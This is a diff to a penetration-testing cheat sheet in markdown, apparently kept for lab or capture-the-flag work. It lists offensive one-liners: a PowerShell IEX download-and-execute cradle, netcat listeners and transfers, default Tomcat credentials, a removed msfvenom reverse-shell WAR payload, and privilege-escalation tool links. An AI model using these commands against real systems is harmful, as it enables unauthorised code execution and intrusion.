@@ -2,8 +2,6 @@
 
 ## Common Commands
 
-Uploading a file with PUT: <code>curl -X PUT http://[IP]/[FILE] -d @[FILE]  -v</code>
-
 Python HTTP Server: <code>python -m SimpleHTTPServer [PORT]</code>
 
 Python FTP Server: <code>python -m pyftpdlib -p 21</code>
@@ -12,13 +10,21 @@ Linux Listener: <code>nc -lnvp [PORT]</code>
 
 Windows Listener: <code>nc.exe -lnvcp [PORT]</code>
 
+Uploading a file with PUT: <code>curl -X PUT http://[IP]/[FILE] -d @[FILE]  -v</code>
+
+### Downloading Files (Curl / Wget)
+
+<code>curl [URL] -o [FILENAME]</code>
+
+<code>wget [URL]</code>
+
 ### Download Files with PowerShell
 
 <code>powershell Invoke-RestMethod -Uri '[URL]' -OutFile '[PATH\TO\FILE\]'</code>
 
 <code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]')"</code>
 
-### Upload / Download files with Netcat
+### Upload / Download Files with Netcat
 
 Download: <code>nc -lnvp [PORT] > [OUT_FILE]</code>
 
@@ -109,10 +115,6 @@ Downloading all files from a directory
 <code>tomcat:s3cr3t</code>
 
 <code>admin:tomcat</code>
-
-#### Payload
-
-<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > shell.war</code>
 
 #### Uploading to Tomcat6
 
@@ -234,7 +236,7 @@ Use listener
 
 ## Linux Privilege Escalation
 
-### Priv Esc Scripts
+### Enumeration Scripts
 
 <code>LinPEAS.sh</code> Found [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
@@ -246,6 +248,14 @@ Use listener
 - [Priv Esc with SUIDs](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
 
 ## Windows Privilege Escalation
+
+### Enumeration Scripts
+
+<code>SharUp.exe</code> Found [here](https://github.com/GhostPack/SharpUp)
+
+<code>Sherlock.ps1</code> Found [here](https://github.com/rasta-mouse/Sherlock)
+
+<code>WinPEAS.exe</code> Found [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 ### Juicy Potato
 
